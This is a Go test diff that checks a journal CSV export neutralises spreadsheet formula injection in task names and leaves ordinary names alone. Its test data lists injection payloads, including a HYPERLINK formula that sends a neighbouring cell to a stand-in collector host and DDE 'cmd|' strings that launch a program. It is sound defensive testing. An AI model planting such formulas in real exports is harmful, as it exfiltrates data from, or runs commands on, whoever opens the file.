@@ -600,3 +600,82 @@ func TestDownloads_JournalCSVSaysWhenItIsPartial(t *testing.T) {
 		t.Errorf("the marker does not say where the file stops: %q", last[1])
 	}
 }
+
+// TestDownloads_JournalCSVDoesNotHandOverALiveFormula is the other half of
+// "safe to hand somebody", and the half the key/value property does not
+// cover.
+//
+// A runbook author writes a task's name as free text and nothing validates
+// it. A name beginning with =, +, - or @ is a formula to Excel, Sheets and
+// LibreOffice rather than a label, so the export this file advertises as
+// forwardable would carry a one-click exfiltration of the row beside it to
+// whoever opened it -- a different person from the author, on an RBAC
+// platform, with a different threat model.
+//
+// Each case asserts the emitted BYTES rather than the column list, which is
+// what the sibling secret-values test cannot do: it reads journalColumns
+// and can only fail on a rename.
+func TestDownloads_JournalCSVDoesNotHandOverALiveFormula(t *testing.T) {
+	triggers := []string{
+		`=HYPERLINK("http://collector.example/?d="&A1,"Open report")`,
+		`+cmd|'/c calc'!A1`,
+		`-2+3+cmd|' /C calc'!A0`,
+		`@SUM(1+1)*cmd|' /C calc'!A0`,
+	}
+
+	for _, name := range triggers {
+		t.Run(name[:8], func(t *testing.T) {
+			e := entry("dev-1", "tasks[0]", 1, engine.OutcomeChanged)
+			e.TaskName = name
+
+			var buf bytes.Buffer
+			if err := writeJournalCSV(&buf, []engine.JournalEntry{e}, false); err != nil {
+				t.Fatalf("writeJournalCSV: %v", err)
+			}
+			records, err := csv.NewReader(&buf).ReadAll()
+			if err != nil {
+				t.Fatalf("the file is not valid CSV: %v", err)
+			}
+
+			var task string
+			for i, col := range records[0] {
+				if col == "task" {
+					task = records[1][i]
+				}
+			}
+			if task == name {
+				t.Fatalf("the task cell is emitted verbatim as %q, so a spreadsheet evaluates it", task)
+			}
+			if !strings.HasPrefix(task, "'") {
+				t.Errorf("the task cell is %q, want the leading apostrophe that makes it text", task)
+			}
+			// Neutralised, not censored. An operator reading the file has
+			// to be able to see what the task was actually called.
+			if !strings.Contains(task, name) {
+				t.Errorf("the task cell is %q, which no longer carries the name %q", task, name)
+			}
+		})
+	}
+}
+
+// TestDownloads_JournalCSVLeavesAnOrdinaryNameAlone is the negative control
+// for the case above: the guard fires on the four trigger characters and on
+// nothing else, so the common file is unchanged.
+func TestDownloads_JournalCSVLeavesAnOrdinaryNameAlone(t *testing.T) {
+	e := entry("dev-1", "tasks[0]", 1, engine.OutcomeChanged)
+	e.TaskName = "restart the thing"
+
+	var buf bytes.Buffer
+	if err := writeJournalCSV(&buf, []engine.JournalEntry{e}, false); err != nil {
+		t.Fatalf("writeJournalCSV: %v", err)
+	}
+	records, err := csv.NewReader(&buf).ReadAll()
+	if err != nil {
+		t.Fatalf("the file is not valid CSV: %v", err)
+	}
+	for i, col := range records[0] {
+		if col == "task" && records[1][i] != "restart the thing" {
+			t.Errorf("an ordinary task name was rewritten to %q", records[1][i])
+		}
+	}
+}
